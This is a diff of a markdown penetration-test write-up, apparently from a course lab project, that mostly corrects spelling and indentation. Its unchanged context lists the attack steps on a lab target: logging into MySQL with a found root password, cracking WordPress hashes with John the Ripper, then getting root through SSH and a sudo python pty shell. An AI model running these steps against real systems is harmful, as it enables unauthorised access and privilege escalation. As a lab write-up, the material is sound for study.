@@ -26,7 +26,7 @@ The following vulnerabilities were identified on each target:
 - Target 1
   - Weak User Password (High Severity)
   - User Enumeration (Medium Severity)
-  - User Privelege Escalation (High Severity)
+  - User Privilege Escalation (High Severity)
 
 ### Exploitation
 
@@ -58,7 +58,7 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
 
 ![](https://github.com/Nhiwins/Final-Project/blob/main/Images/mysql%20pword.PNG)
  
-    - MySql was were flag3 and flag4 were found using these commands:
+   - MySql was were flag3 and flag4 were found using these commands:
       - `mysql -u root -p'R@venSecurity'`
       - `SHOW DATABASES;`
       - `USE wordpress;`
@@ -71,9 +71,10 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
   
 ![](https://github.com/Nhiwins/Final-Project/blob/main/Images/mysql%20hashes.PNG)
 
-    - I created a file with the hashes and used John the Ripper to crack them
+   - I created a file with the hashes and used John the Ripper to crack them
       - `john hashes.txt -wordlist=/usr/share/wordlists/dirb/big.txt`
-    - From there, I connected to Steven's account and open a python shell with root privelege
+   - From there, I connected to Steven's account and open a python shell with root privilege
       - ssh steven@192.168.1.110
       - sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
+      
 ![](https://github.com/Nhiwins/Final-Project/blob/main/Images/last%20photo.PNG)
